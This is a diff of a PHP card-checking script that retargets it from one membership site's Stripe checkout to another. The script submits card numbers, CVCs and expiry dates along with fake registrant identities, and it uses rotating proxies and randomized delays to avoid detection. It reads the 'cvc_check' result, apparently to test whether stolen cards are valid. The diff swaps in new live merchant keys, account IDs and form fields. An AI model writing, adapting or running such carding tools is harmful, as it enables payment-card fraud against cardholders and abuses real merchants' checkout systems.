@@ -117,7 +117,7 @@ $street = $data['results'][0]['location']['street']['name'];
 
 // Step 1: Fetch the page to get the nonce value
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.doane.us/membership-account-new/membership-checkout/');
+curl_setopt($ch, CURLOPT_URL, 'https://provideme.io/membership-account/membership-checkout-2/');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -159,7 +159,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
 // Insert simulated delay before posting form data
  sleep(rand(1, 2)); // A longer delay to simulate a pause before submission
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=152936c2-270c-42fc-8b9b-419d347c8a677f80b9&muid=02cd223f-04ec-4dfa-a540-2b81f331208f00654f&sid=b8bbc87d-975f-4c4f-9c58-9906dbd1324f3210fb&pasted_fields=number&payment_user_agent=stripe.js%2Ff52291c812%3B+stripe-js-v3%2Ff52291c812%3B+split-card-element&referrer=https%3A%2F%2Fwww.doane.us&time_on_page=222764&client_attribution_metadata[client_session_id]=6c5b71b2-d127-4258-8145-85b5c7f1c25e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_168hGFAoD6Z5UbBG');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=cfaed93d-4b66-4a41-ad34-fe9d85613de5785366&muid=413fd995-efee-4627-92dd-c67260375761d7a25a&sid=e62483c3-698b-4c78-8368-6cc85cc8ff7ae4cb1c&pasted_fields=number&payment_user_agent=stripe.js%2F0f795842d4%3B+stripe-js-v3%2F0f795842d4%3B+split-card-element&referrer=https%3A%2F%2Fprovideme.io&time_on_page=102837&client_attribution_metadata[client_session_id]=b69e5a38-ea3a-46ba-9393-87930c31db68&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1PHEaRP9XqsP2YSY');
 
 // Continue with the rest of the code
 $result1 = curl_exec($ch);
@@ -168,7 +168,7 @@ curl_close($ch);
 $proxy = rebootproxys();
 list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.doane.us/membership-account-new/membership-checkout/');
+curl_setopt($ch, CURLOPT_URL, 'https://provideme.io/membership-account/membership-checkout-2/');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -182,8 +182,8 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-    'origin: https://www.doane.us',
-    'referer: https://www.doane.us/membership-account-new/membership-checkout/',
+    'origin: https://provideme.io',
+    'referer: https://provideme.io/membership-account/membership-checkout-2/',
     'sec-fetch-dest: document',
     'sec-fetch-mode: navigate',
     'sec-fetch-site: same-origin',
@@ -191,7 +191,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'x-requested-with: XMLHttpRequest',
 ));
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'pmpro_level=2&checkjavascript=1&pmpro_other_discount_code=&username='.$rnd.'t'.$lastname.'&password='.$lastname.'99007%40&password2='.$lastname.'99007%40&first_name='.$firstname.'&last_name='.$lastname.'&bemail='.$rnd.'w'.$firstname.'g%40gmail.com&bconfirmemail='.$rnd.'w'.$firstname.'g%40gmail.com&fullname=&pmpropp_chosen_plan=2&CardType=mastercard&pmpro_discount_code=&tos=1&pmpro_checkout_nonce='.$nonce.'&_wp_http_referer=%2Fmembership-account-new%2Fmembership-checkout%2F&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'pmpro_level=1&checkjavascript=1&pmpro_other_discount_code=&username='.$rnd.'111&password='.$firstname.'002%401&password2='.$firstname.'002%401&bemail='.$firstname.'3'.$rnd.'0%40gmail.com&bconfirmemail='.$firstname.'3'.$rnd.'0%40gmail.com&fullname=&CardType=visa&pmpro_discount_code=&tos=1&pmpro_checkout_nonce='.$nonce.'&_wp_http_referer=%2Fmembership-account%2Fmembership-checkout-2%2F&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
 $result2 = curl_exec($ch);
 $cvc_check = trim(strip_tags(GetStr($result2, '"cvc_check":"', '"')));
 $info = curl_getinfo($ch);
@@ -717,8 +717,7 @@ else {
 curl_close($ch);
 ob_flush();
 flush();
-echo "<b>1REQ Result:</b> $result1<br><br>";
-echo "<b>2REQ Result:</b> $result2<br><br>";
+//echo "<b>1REQ Result:</b> $result1<br><br>";
+//echo "<b>2REQ Result:</b> $result2<br><br>";
 
 ?>
-
